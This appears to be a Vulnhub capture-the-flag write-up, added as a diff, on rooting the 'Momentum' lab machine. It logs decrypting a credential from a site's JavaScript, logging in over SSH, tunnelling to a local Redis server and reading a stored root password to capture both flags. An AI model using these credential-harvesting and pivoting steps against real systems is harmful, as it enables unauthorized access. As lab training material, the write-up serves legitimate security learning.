@@ -1,0 +1,124 @@
+========================================== 
+|               Enumeration              |
+========================================== 
+
+*** Only port 22 and 80 are open (see nmap result scan).
+*** Gobuster didn't show any intersting URIs so I browsed the one founds and came across an intersting JS script 
+
+var CryptoJS = require("crypto-js");
+var decrypted = CryptoJS.AES.decrypt("U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt", "SecretPassphraseMomentum");
+console.log(decrypted.toString(CryptoJS.enc.Utf8));
+
+
+to decrypt this I installed nod 
+
+root@black-sh:~/Vulnhub/momentum# nodejs
+Welcome to Node.js v12.21.0.
+Type ".help" for more information.
+> var CryptoJS = require("crypto-js");
+undefined
+> var decrypted = CryptoJS.AES.decrypt("U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt", "SecretPassphraseMomentum");
+undefined
+> console.log(decrypted.toString(CryptoJS.enc.Utf8));
+auxerre-alienum##
+undefined
+> dec
+Uncaught ReferenceError: dec is not defined
+> decrypted
+{
+  words: [
+    1635088485, 1920099629,
+    1634494821, 1853189411,
+     588189455,  252645135,
+     252645135,  252645135
+  ],
+  sigBytes: 17
+}
+> console.log('\x1b[33m%s\x1b[0m', 'hi!')
+hi!
+undefined
+> decrypted.toString(CryptoJS.enc.Utf8)
+'auxerre-alienum##'
+
+*** this is he password of auxerre
+
+========================================== 
+|              Exploitation              |
+========================================== 
+
+root@black-sh:~/Vulnhub/momentum# ssh auxerre@192.168.15.169
+auxerre@192.168.15.169's password: 
+Linux Momentum 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Apr 22 08:47:31 2021
+auxerre@Momentum:~$ sudo -l
+-bash: sudo: command not found
+auxerre@Momentum:~$ ls
+user.txt
+auxerre@Momentum:~$ cat user.txt
+[ Momentum - User Owned ]
+---------------------------------------
+flag : 84157165c30ad34d18945b647ec7f647
+---------------------------------------
+
+ ========================================== 
+|             Post-Exploitation           |
+ ========================================== 
+
+*** pspy64s showed a redisserver is running in the server this the way we will get the root as follow:
+
+2021/04/30 04:53:38 CMD: UID=33   PID=560    | /usr/sbin/apache2 -k start 
+2021/04/30 04:53:38 CMD: UID=0    PID=56     | 
+2021/04/30 04:53:38 CMD: UID=33   PID=559    | /usr/sbin/apache2 -k start 
+2021/04/30 04:53:38 CMD: UID=33   PID=558    | /usr/sbin/apache2 -k start 
+2021/04/30 04:53:38 CMD: UID=33   PID=557    | /usr/sbin/apache2 -k start 
+2021/04/30 04:53:38 CMD: UID=0    PID=555    | /usr/sbin/apache2 -k start 
+2021/04/30 04:53:38 CMD: UID=0    PID=551    | /usr/sbin/sshd -D 
+2021/04/30 04:53:38 CMD: UID=107  PID=550    | /usr/bin/redis-server 127.0.0.1:6379        
+2021/04/30 04:53:38 CMD: UID=0    PID=55     | 
+2021/04/30 04:53:38 CMD: UID=0    PID=54     | 
+2021/04/30 04:53:38 CMD: UID=0    PID=539    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
+2021/04/30 04:53:38 CMD: UID=0    PID=53     |
+
+
+root@black-sh:~/Vulnhub/momentum# ssh -L 6379:127.0.0.1:6379  auxerre@192.168.15.169
+auxerre@192.168.15.169's password: 
+Linux Momentum 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Apr 30 04:47:14 2021 from 192.168.15.130
+
+root@black-sh:~# redis-cli -h 127.0.0.1
+127.0.0.1:6379> keys *
+1) "rootpass"
+127.0.0.1:6379> get rootpass
+"m0mentum-al1enum##"
+127.0.0.1:6379> 
+auxerre@Momentum:~$ su root 
+Password: 
+root@Momentum:/home/auxerre# cd
+root@Momentum:~# ls
+root.txt
+root@Momentum:~# id;cat root.txt;hostname;date
+uid=0(root) gid=0(root) groups=0(root)
+[ Momentum - Rooted ]
+---------------------------------------
+Flag : 658ff660fdac0b079ea78238e5996e40
+---------------------------------------
+by alienum with <3
+
+Momentum
+Fri 30 Apr 2021 05:55:46 AM EDT
+root@Momentum:~# 
+
